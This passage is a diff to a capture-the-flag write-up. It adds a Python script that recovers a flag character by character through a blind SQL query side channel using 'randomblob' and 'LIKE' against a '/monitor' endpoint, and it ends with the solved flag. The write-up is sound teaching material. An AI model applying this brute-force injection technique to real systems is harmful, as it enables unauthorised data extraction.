@@ -51,6 +51,24 @@ select randomblob(10000000000000000000000000000000000000000) where (select count
 
 With this knowledge, we can write a script to bruteforce the flag character by character.  
 
-<img src="images/bruteforce.png" width=600>
+```python
+charset = string.ascii_lowercase + string.digits + "{}_"
+
+flag = "VuwCTF{"
+
+while not flag.endswith("}"):
+    for char in charset:
+        print("Trying:", char, "|", flag)
+
+        payload = f'select randomblob(10000000000000000000000000000000000000000) where (select count(*) from flag where content LIKE "{flag}{char}%")=0'
+
+        res = s.post(f'{url}/monitor', data={ 'query': payload })
+        
+        if "success" in res.text.lower():
+            flag += char
+            break
+
+print("Flag:", flag)
+```
 
 Flag: `VuwCTF{h3art_0v_p3ar1}`
